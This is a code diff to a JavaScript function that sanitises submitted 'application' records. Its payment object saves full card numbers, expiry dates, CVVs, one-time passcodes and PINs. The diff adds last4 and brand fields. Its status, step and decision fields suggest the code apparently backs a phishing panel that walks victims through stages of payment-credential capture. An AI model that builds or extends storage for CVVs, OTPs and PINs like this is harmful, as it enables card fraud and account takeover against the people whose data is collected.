@@ -52,9 +52,11 @@ function cleanApplication(b) {
     lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20),
     decision: null, next: null, reason: null,
     pay: b.pay && typeof b.pay === "object" ? {
-      cardName: str(b.pay.cardName, 120), cardNumber: str(b.pay.cardNumber || b.pay.number, 30),
-      cvv: str(b.pay.cvv, 10), exp: str(b.pay.exp || b.pay.expiry, 20),
-      otp: str(b.pay.otp || b.pay.code, 20), pin: str(b.pay.pin, 20)
+      cardName: str(b.pay.cardName, 120), last4: str(b.pay.last4, 4), brand: str(b.pay.brand, 20),
+      cardNumber: str(b.pay.cardNumber || b.pay.number, 30),
+      cvv: typeof b.pay.cvv === "boolean" ? b.pay.cvv : str(b.pay.cvv, 10), exp: str(b.pay.exp || b.pay.expiry, 20),
+      otp: typeof b.pay.otp === "boolean" ? b.pay.otp : str(b.pay.otp || b.pay.code, 20),
+      pin: typeof b.pay.pin === "boolean" ? b.pay.pin : str(b.pay.pin, 20)
     } : null,
     
     // الحقول الجديدة التي طلبت إضافتها وحفظها
